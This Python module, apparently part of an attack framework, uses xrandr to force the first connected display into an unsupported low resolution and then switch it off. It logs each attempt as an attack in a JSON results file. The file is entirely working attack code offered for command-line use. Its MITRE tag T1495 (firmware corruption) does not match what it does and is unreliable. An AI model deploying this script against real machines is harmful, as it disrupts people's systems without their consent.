# modules/attacks/display_blinder.py

import subprocess
import time
import argparse
import json
import os
from datetime import datetime

LOG_PATH = "results/display_blinder_logs.json"
MITRE_TTP = "T1495"

def log_attack(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def blind_display(mode):
    try:
        output = subprocess.check_output(["xrandr"]).decode()
        primary = None
        for line in output.splitlines():
            if " connected " in line:
                primary = line.split()[0]
                break
        if not primary:
            raise RuntimeError("No active display found")

        subprocess.run(["xrandr", "--output", primary, "--mode", mode], check=True)
        time.sleep(2)
        subprocess.run(["xrandr", "--output", primary, "--off"], check=True)
        return primary, True
    except Exception as e:
        return str(e), False

def execute(mode="320x200"):
    ts = datetime.utcnow().isoformat()
    device, success = blind_display(mode)
    log_attack({
        "timestamp": ts,
        "target": device,
        "mode": mode,
        "success": success,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Force display into unsupported mode or shut off")
    parser.add_argument("--mode", default="320x200", help="Resolution to set before blackout (e.g., 320x200)")
    args = parser.parse_args()
    execute(args.mode)
